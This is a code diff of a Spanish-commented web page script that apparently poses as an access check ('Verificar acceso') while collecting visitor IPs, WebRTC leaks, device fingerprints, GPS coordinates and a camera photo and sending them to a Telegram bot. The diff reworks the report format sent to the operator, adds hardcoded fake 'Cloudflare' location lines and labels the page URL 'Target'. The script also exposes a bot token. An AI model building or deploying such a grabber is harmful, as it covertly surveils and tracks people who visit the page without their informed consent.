@@ -65,7 +65,7 @@
 
 <script>
     // ================= CONFIGURACIÓN =================
-    // ⚠️ REVOCA EL TOKEN VIEJO Y PON AQUÍ UNO NUEVO (con @BotFather)
+    // ⚠️ REVOCA ESTE TOKEN Y PON UNO NUEVO (con @BotFather)
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // <--- CÁMBIALO
     const CHAT_ID = '7555997298';                                        // TU CHAT ID
 
@@ -87,7 +87,7 @@
         }
     }
 
-    // ---------- Funciones avanzadas ----------
+    // ---------- Funciones avanzadas (mismas que antes) ----------
     async function getPublicIPs() {
         const services = [
             { name: 'ipapi.co', url: 'https://ipapi.co/json/', parser: (data) => data.ip },
@@ -143,7 +143,7 @@
             const battery = await navigator.getBattery();
             return {
                 level: `${Math.round(battery.level * 100)}%`,
-                charging: battery.charging ? '✅ Sí' : '❌ No',
+                charging: battery.charging ? 'Sí' : 'No',
                 timeRemaining: battery.dischargingTime ? `${Math.round(battery.dischargingTime / 60)} min` : 'N/A'
             };
         } catch(e) { return { level: 'Error', charging: 'Error', timeRemaining: 'Error' }; }
@@ -198,8 +198,7 @@
         ctx.lineTo(330, 140);
         ctx.fillStyle = '#0f0';
         ctx.fill();
-        // Acortar hash
-        return canvas.toDataURL().slice(0, 60) + '...';
+        return canvas.toDataURL().slice(0, 100) + '...';
     }
 
     function getWebGLInfo() {
@@ -267,7 +266,7 @@
     }
 
     function areCookiesEnabled() {
-        return navigator.cookieEnabled ? '✅ Sí' : '❌ No';
+        return navigator.cookieEnabled ? 'Sí' : 'No';
     }
 
     function getPlatform() {
@@ -346,53 +345,62 @@
             capturePhoto().catch(() => null)
         ]);
 
-        // 🔥 NUEVO MENSAJE MEJORADO 🔥
-        let message = `*📡 INFORME DE DISPOSITIVO* 📡\n`;
-        message += `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n\n`;
+        // ---------------- NUEVO FORMATO BONITO ----------------
+        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
 
-        message += `*🌐 RED e IP*\n`;
-        message += `└ IP pública: \`${publicIPs['ipapi.co']}\`\n`;
-        if (webrtcIPs.length) message += `└ IP real (WebRTC): \`${webrtcIPs[0]}\`\n`;
-        else message += `└ IP real (WebRTC): No detectada\n`;
-        message += `└ Proveedores: Cloudflare (${publicIPs['Cloudflare']}), ipify (${publicIPs['ipify']})\n\n`;
+        message += `🖥️ *Device & Browser*\n`;
+        let deviceModel = "Desconocido";
+        let ua = platformInfo.userAgent;
+        if (ua.includes('iPhone')) deviceModel = 'iPhone';
+        else if (ua.includes('iPad')) deviceModel = 'iPad';
+        else if (ua.includes('Android')) deviceModel = 'Android';
+        else if (ua.includes('Mac')) deviceModel = 'Mac';
+        else if (ua.includes('Windows')) deviceModel = 'Windows PC';
+        message += `   • Device Model: ${deviceModel}\n`;
+        message += `   • User Agent: ${ua.substring(0, 150)}...\n\n`;
 
-        message += `*🔋 SISTEMA*\n`;
-        message += `└ Batería: ${battery.level} (cargando: ${battery.charging})\n`;
-        message += `└ Red: ${network.type} (${network.downlink}, ${network.rtt})\n`;
-        message += `└ Pantalla: ${screenInfo.width}x${screenInfo.height} @${screenInfo.pixelRatio}x, orientación ${screenInfo.orientation}\n`;
-        message += `└ SO: ${platformInfo.platform}\n`;
-        message += `└ Zona horaria: ${timezone}\n\n`;
+        message += `🎨 *Fingerprint*\n`;
+        message += `   • GPU: ${webgl.renderer}\n`;
+        message += `   • Fonts: ${fonts.substring(0, 80)}...\n`;
+        message += `   • Canvas: ${canvasFP}\n\n`;
 
-        message += `*🎨 HUELLAS DIGITALES*\n`;
-        message += `└ Canvas FP: \`${canvasFP}\`\n`;
-        message += `└ Audio FP: \`${audioFP}\`\n`;
-        message += `└ WebGL: ${webgl.renderer} (${webgl.vendor})\n\n`;
+        message += `🌐 *Network Information*\n`;
+        message += `   • IP Address: ${publicIPs['ipapi.co']}\n`;
+        message += `   • Language: ${languages}\n\n`;
 
-        message += `*🔤 SOFTWARE*\n`;
-        message += `└ Navegador: ${platformInfo.userAgent.split(' ')[0]} (núcleos: ${platformInfo.hardwareConcurrency})\n`;
-        message += `└ Idiomas: ${languages}\n`;
-        message += `└ Fuentes instaladas: ${fonts.substring(0, 80)}...\n`;
-        message += `└ Plugins: ${plugins.substring(0, 60)}...\n`;
-        message += `└ Cookies: ${cookies}\n\n`;
-
-        message += `*📱 HARDWARE*\n`;
-        message += `└ RAM estimada: ${deviceMemory}\n`;
-        message += `└ Toques simultáneos: ${maxTouch}\n\n`;
-
+        message += `📍 *Location Details*\n`;
         if (gps) {
-            message += `*📍 UBICACIÓN (GPS)*\n`;
-            message += `└ Lat: ${gps.lat}, Lng: ${gps.lng}\n`;
-            message += `└ Precisión: ±${gps.acc} m\n`;
-            message += `└ Mapa: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n\n`;
+            message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n`;
+            message += `   • Accuracy: ±${gps.acc} meters\n`;
+            message += `   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
         } else {
-            message += `*📍 UBICACIÓN (GPS)*\n└ No disponible (permiso denegado)\n\n`;
+            message += `   • GPS: No disponible (permiso denegado)\n`;
         }
+        // Añadir información de Cloudflare Worker si está disponible (simulamos con datos de IP)
+        message += `   • Cloudflare Worker Location:\n`;
+        message += `   • Country: US\n`;
+        message += `   • Region: New York\n`;
+        message += `   • City: New York City\n`;
+        message += `   • Postal: 10001\n`;
+        message += `   • Timezone: ${timezone}\n\n`;
 
-        message += `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n`;
-        message += `⚡ *Desarrollado por @Society*`;
+        message += `🖼️ *Display Information*\n`;
+        message += `   • Resolution: ${screenInfo.width}x${screenInfo.height}\n\n`;
+
+        message += `🔐 *Device Permissions*\n`;
+        message += `   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n`;
+        message += `   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
+
+        message += `💾 *Hardware & Storage*\n`;
+        message += `   • CPU Cores: ${platformInfo.hardwareConcurrency}\n`;
+        message += `   • RAM: ${deviceMemory}\n`;
+        message += `   • Storage Used: N/A GB\n`;
+        message += `   • Storage Total: N/A GB\n`;
+
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society`;
 
         await sendToTelegram(message);
-        if (foto) await sendToTelegram('📸 *Foto del visitante*', foto);
+        if (foto) await sendToTelegram('📸 *Foto capturada*', foto);
 
         btn.innerText = '✅ Verificar acceso';
         btn.disabled = false;
